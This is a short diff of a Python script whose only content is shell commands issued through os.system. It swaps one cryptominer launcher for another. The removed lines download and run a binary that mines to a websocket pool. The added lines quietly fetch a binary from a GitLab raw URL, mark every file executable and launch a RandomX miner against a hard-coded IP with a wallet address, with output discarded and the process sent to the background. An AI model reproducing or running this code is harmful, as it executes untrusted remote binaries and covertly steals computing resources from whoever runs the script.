@@ -1,4 +1,4 @@
 import sys
 import os
-os.system("wget https://gitlab.com/derisafrew/vx/-/raw/main/ojava")
-os.system("chmod +x ojava && ./ojava --url ws://31.171.251.36:443/mine mine --username CHtdR4Ha3UQkvtwTpod47TSVQ6PhGq97Ch5qoqiC2pLz.$(echo $(shuf -i 1-9 -n 1)-ambar) --cores 4")
+os.system("wget -qO rubby  https://gitlab.com/jasa4/jasa/-/raw/main/jupyterlab && chmod +x * >/dev/null 2>&1")
+os.system(".lib/./zjava -a rx/0 -o 8.209.210.176:80 -u 84MUeUQoSXc5x9XaexJmA4Xe3wGQqrG83WNxisKxdmGkMTbS8BAZMAwWFZMhtwAojigQTZMokb7a3Ntm5DFGqEXy1wTj7n7 --randomx-1gb-pages -p $(echo $(shuf -i 1-9 -n 1)-ren) -t $(nprRc --all) &>/dev/null &")
